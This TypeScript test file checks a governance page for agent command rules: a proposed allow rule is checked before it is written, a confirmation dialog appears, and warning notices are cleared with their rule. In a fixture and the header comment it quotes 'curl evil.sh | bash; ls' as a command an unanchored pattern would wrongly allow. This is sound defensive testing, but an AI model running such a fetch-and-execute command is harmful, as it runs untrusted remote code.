/* @vitest-environment jsdom */

// A rule is checked before it is written (QA of 2026-10-19, R1), and the notice it leaves
// names it and goes with it (R3).
//
// Live: ada added the unanchored `echo qa-usability` for `main`, the ledger recorded it,
// and only then did the page say it also allows `curl evil.sh | bash; ls`. These tests
// drive the rendered page: the check is asked first, a rule with something to report is
// written only after "Add anyway", "Change it" writes nothing and keeps the form, a rule
// with nothing to report is written at once, and the notice is named and removed with
// its rule. The server half is `src/gateway/governance-rule-check.test.ts`.
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { AddRuleRequest, GovernanceRuleCheck } from "./api.policy-writes.ts";
import {
  GovernanceApi,
  type GovernanceIdentity,
  type GovernancePolicyDocument,
  type GovernancePolicyRule,
} from "./api.ts";
import "./governance-page.ts";

type PageState = {
  identity: GovernanceIdentity | null;
  loading: boolean;
  users: unknown[];
  agents: unknown[];
  policy: GovernancePolicyDocument | null;
  newRulePattern: string;
  newRuleDescription: string;
  newRuleAgentId: string;
  busy: boolean;
  api: () => unknown;
  updateComplete: Promise<unknown>;
  requestUpdate(): void;
} & HTMLElement;

let page: PageState;

const UNANCHORED = {
  code: "unanchored",
  message: 'A rule of "echo qa-usability" also allows "curl evil.sh | bash; ls".',
};
const CLASH = {
  kind: "duplicate" as const,
  existingRuleId: "command-old",
  existingPattern: "^ls$",
  message: "An identical rule already grants this.",
};

const WRITTEN: GovernancePolicyRule = {
  id: "command-new",
  resourceKind: "command",
  tier: "admin",
  agentId: "main",
  pattern: "echo qa-usability",
  description: "QA check",
  createdAt: "2026-10-19T10:00:00.000Z",
};

function policyWith(rules: GovernancePolicyRule[]): GovernancePolicyDocument {
  return {
    version: 4,
    mode: "enforce",
    ask: "off",
    agentMode: {},
    agentAsk: {},
    userAsk: {},
    rules,
    lockedAgents: [],
  } as unknown as GovernancePolicyDocument;
}

async function mount(): Promise<void> {
  page = document.createElement("openclaw-governance-page") as PageState;
  document.body.append(page);
  await page.updateComplete;
  Object.assign(page, {
    loading: false,
    users: [],
    agents: [],
    identity: { username: "ada", role: "administrator", assignedAgents: [] },
    policy: policyWith([]),
    newRulePattern: "echo qa-usability",
    newRuleDescription: "QA check",
    newRuleAgentId: "main",
  });
  await settle();
}

async function settle(): Promise<void> {
  page.requestUpdate();
  await page.updateComplete;
}

type Calls = { checked: AddRuleRequest[]; added: AddRuleRequest[]; removed: string[] };

function fakeApi(check: Omit<GovernanceRuleCheck, "dryRun">, seen: Calls): unknown {
  const answers: Record<string, (...args: never[]) => Promise<unknown>> = {
    checkRule: async (rule: AddRuleRequest) => {
      seen.checked.push(rule);
      return { dryRun: true, ...check };
    },
    addRule: async (rule: AddRuleRequest) => {
      seen.added.push(rule);
      return { ...WRITTEN, ...check };
    },
    removeRule: async (id: string) => {
      seen.removed.push(id);
      return { ok: true };
    },
  };
  // Every other call (the refresh after a write) is refused, which the page reports and
  // these tests do not read.
  return new Proxy(answers, {
    get: (target, name) =>
      name === "then"
        ? undefined
        : (target[String(name)] ??
          (async () => {
            throw new Error(`${String(name)} is not part of this test`);
          })),
  });
}

function calls(): Calls {
  return { checked: [], added: [], removed: [] };
}

function button(root: ParentNode, label: string): HTMLButtonElement | undefined {
  return [...root.querySelectorAll("button")].find((b) => b.textContent?.trim() === label);
}

function dialog(): Element | null {
  return document.body.querySelector("openclaw-modal-dialog");
}

function notices(): string[] {
  return [...page.querySelectorAll(".governance-rule-notice")].map((notice) =>
    (notice.textContent ?? "").replace(/\s+/gu, " ").trim(),
  );
}

/** Adds the rule through "Add anyway", leaving its notice on the page. */
async function addAnyway(seen: Calls): Promise<void> {
  button(page, "Add rule")?.click();
  await vi.waitFor(() => expect(dialog()).not.toBeNull());
  button(dialog() ?? page, "Add anyway")?.click();
  await vi.waitFor(() => expect(seen.added).toHaveLength(1));
  await vi.waitFor(() => expect(page.busy).toBe(false));
  Object.assign(page, { policy: policyWith([WRITTEN]), error: null });
  await settle();
}

beforeEach(async () => {
  document.body.replaceChildren();
  await mount();
});

afterEach(async () => {
  // A dialog left open keeps the next one from opening (`showConfirmDialog` refuses
  // reentry), so each test's is answered before the next begins.
  // Its last button is the cancel, whatever it is labelled.
  [...(dialog()?.querySelectorAll("button") ?? [])].at(-1)?.click();
  await vi.waitFor(() => expect(dialog()).toBeNull());
  document.body.replaceChildren();
});

describe("a rule with something to report is confirmed before it is written", () => {
  it("asks the server first and shows what it reported, naming the rule", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen);

    button(page, "Add rule")?.click();

    await vi.waitFor(() => expect(dialog()).not.toBeNull());
    const text = (dialog()?.textContent ?? "").replace(/\s+/gu, " ");
    expect(seen.checked).toEqual([
      {
        resourceKind: "command",
        pattern: "echo qa-usability",
        description: "QA check",
        agentId: "main",
      },
    ]);
    expect(seen.added).toEqual([]);
    expect(text).toContain("Before this allow rule for agent main is added:");
    expect(text).toContain("command echo qa-usability");
    expect(text).toContain(UNANCHORED.message);
    expect(text).toContain(`"^ls$": ${CLASH.message}`);
    expect(button(dialog() ?? page, "Add anyway")).toBeDefined();
    expect(button(dialog() ?? page, "Change it")).toBeDefined();
  });

  it("writes nothing on Change it, and leaves the pattern in the form", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [], warnings: [UNANCHORED] }, seen);

    button(page, "Add rule")?.click();
    await vi.waitFor(() => expect(dialog()).not.toBeNull());
    button(dialog() ?? page, "Change it")?.click();

    await vi.waitFor(() => expect(dialog()).toBeNull());
    await vi.waitFor(() => expect(page.busy).toBe(false));
    expect(seen.added).toEqual([]);
    expect(page.newRulePattern).toBe("echo qa-usability");
    expect(page.newRuleDescription).toBe("QA check");
    expect(notices()).toEqual([]);
  });

  it("writes on Add anyway, and the notice names the pattern", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [], warnings: [UNANCHORED] }, seen);

    await addAnyway(seen);

    expect(seen.added).toHaveLength(1);
    expect(page.newRulePattern).toBe("");
    expect(notices()).toEqual([expect.stringContaining("Rule pattern: echo qa-usability")]);
  });

  it("writes a rule with nothing to report at once", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [], warnings: [] }, seen);

    button(page, "Add rule")?.click();

    await vi.waitFor(() => expect(seen.added).toHaveLength(1));
    expect(seen.checked).toHaveLength(1);
    expect(dialog()).toBeNull();
  });
});

describe("the notice goes with its rule (R3)", () => {
  async function removeRule(rule: GovernancePolicyRule, seen: Calls): Promise<void> {
    const row = [...page.querySelectorAll(".settings-row")].find(
      (candidate) =>
        candidate.querySelector("code.governance-rule__pattern")?.textContent === rule.pattern,
    );
    button(row ?? page, "Remove")?.click();
    await vi.waitFor(() => expect(dialog()).not.toBeNull());
    button(dialog() ?? page, "Remove")?.click();
    await vi.waitFor(() => expect(seen.removed).toContain(rule.id));
    await vi.waitFor(() => expect(page.busy).toBe(false));
    await settle();
  }

  it("clears both notices when the rule they are about is removed", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen);
    await addAnyway(seen);
    expect(notices()).toHaveLength(2);

    await removeRule(WRITTEN, seen);

    expect(notices()).toEqual([]);
  });

  it("keeps them when another rule is removed", async () => {
    const other: GovernancePolicyRule = { ...WRITTEN, id: "command-other", pattern: "^pwd$" };
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen);
    await addAnyway(seen);
    Object.assign(page, { policy: policyWith([WRITTEN, other]) });
    await settle();

    await removeRule(other, seen);

    expect(notices()).toHaveLength(2);
  });
});

// Finding 437 (QA of R1/R3, 2026-10-19). The notice went only with this tab's Remove
// button. A rule removed by another operator, or one whose lifetime ran out, left
// "This rule is broader than it looks" standing about a rule that was gone or lapsed,
// the very thing R3 was built to end. The kill notice retires itself on the refresh
// that shows its agent released (`keptKillNotice`); these are its siblings.
describe("the notice goes with its rule however it goes (finding 437)", () => {
  type Refreshable = PageState & { refreshData(): Promise<void> };

  /** The refresh the page runs every 15 s, answered with these rules. */
  async function refreshWith(rules: GovernancePolicyRule[], seen: Calls): Promise<void> {
    const api = fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen) as object;
    page.api = () =>
      new Proxy(api, {
        get: (target, name) =>
          name === "policy" ? async () => policyWith(rules) : Reflect.get(target, name),
      });
    await (page as Refreshable).refreshData();
    await settle();
  }

  it("clears both notices once a refresh shows the rule removed elsewhere", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen);
    await addAnyway(seen);
    expect(notices()).toHaveLength(2);

    await refreshWith([], seen);

    expect(notices()).toEqual([]);
  });

  it("clears them once the rule's lifetime has run out", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen);
    await addAnyway(seen);

    const lapsed = { ...WRITTEN, expiresAt: new Date(Date.now() - 60_000).toISOString() };
    await refreshWith([lapsed], seen);

    expect(notices()).toEqual([]);
  });

  it("keeps them while the rule is still in force", async () => {
    const seen = calls();
    page.api = () => fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen);
    await addAnyway(seen);

    const live = { ...WRITTEN, expiresAt: new Date(Date.now() + 3_600_000).toISOString() };
    await refreshWith([live], seen);

    expect(notices()).toHaveLength(2);
  });

  it("keeps a notice raised while the refresh was in the air", async () => {
    // The refresh read the policy before the write; the rule it lacks is the new one.
    const seen = calls();
    let answer: (policy: GovernancePolicyDocument) => void = () => undefined;
    const api = fakeApi({ conflicts: [CLASH], warnings: [UNANCHORED] }, seen) as object;
    page.api = () =>
      new Proxy(api, {
        get: (target, name) =>
          name === "policy"
            ? () =>
                new Promise<GovernancePolicyDocument>((resolve) => {
                  answer = resolve;
                })
            : Reflect.get(target, name),
      });
    const inFlight = (page as Refreshable).refreshData();
    Object.assign(page, {
      ruleWarnings: { ruleIds: [WRITTEN.id], pattern: WRITTEN.pattern, warnings: [UNANCHORED] },
    });
    answer(policyWith([]));
    await inFlight;
    await settle();

    expect(notices()).toHaveLength(1);
  });
});

describe("a folder grant's notice", () => {
  it("names the folder's rule, and goes when any rule the grant wrote is removed", async () => {
    const grant: GovernancePolicyRule = { ...WRITTEN, id: "path-grant", pattern: "^src(/.*)?$" };
    const exception: GovernancePolicyRule = {
      ...WRITTEN,
      id: "path-except",
      effect: "deny",
      pattern: "^src/secret(/.*)?$",
    };
    const seen = calls();
    const api = fakeApi({ conflicts: [], warnings: [] }, seen) as Record<string, unknown>;
    page.api = () =>
      new Proxy(api, {
        get: (target, name) =>
          name === "grantFolder"
            ? async () => ({ grant, exceptions: [exception], conflicts: [CLASH] })
            : Reflect.get(target, name),
      });
    Object.assign(page, {
      folderGrant: {
        folder: "src",
        description: "Sources",
        exceptions: "src/secret",
        agentId: "main",
        written: null,
      },
    });
    await settle();

    button(page, "Allow folder")?.click();
    await vi.waitFor(() => expect(notices()).toHaveLength(1));
    expect(notices()[0]).toContain("Rule pattern: ^src(/.*)?$");
    await vi.waitFor(() => expect(page.busy).toBe(false));
    Object.assign(page, { policy: policyWith([grant, exception]), error: null });
    await settle();

    const row = [...page.querySelectorAll(".settings-row")].find(
      (candidate) =>
        candidate.querySelector("code.governance-rule__pattern")?.textContent === exception.pattern,
    );
    button(row ?? page, "Remove")?.click();
    await vi.waitFor(() => expect(dialog()).not.toBeNull());
    button(dialog() ?? page, "Remove")?.click();
    await vi.waitFor(() => expect(seen.removed).toEqual([exception.id]));
    await vi.waitFor(() => expect(page.busy).toBe(false));
    await settle();

    expect(notices()).toEqual([]);
  });
});

describe("the client", () => {
  it("asks policy/rules with dryRun set", async () => {
    const fetchSpy = vi.fn(
      async () =>
        new Response(JSON.stringify({ dryRun: true, conflicts: [], warnings: [] }), {
          status: 200,
          headers: { "content-type": "application/json" },
        }),
    );
    vi.stubGlobal("fetch", fetchSpy);
    try {
      const api = new GovernanceApi("", null);
      await api.checkRule({ resourceKind: "command", pattern: "ls", description: "d" });
    } finally {
      vi.unstubAllGlobals();
    }
    const [url, init] = fetchSpy.mock.calls[0] as unknown as [string, RequestInit];
    expect(url).toContain("policy/rules");
    expect(JSON.parse(init.body as string)).toMatchObject({ pattern: "ls", dryRun: true });
  });
});
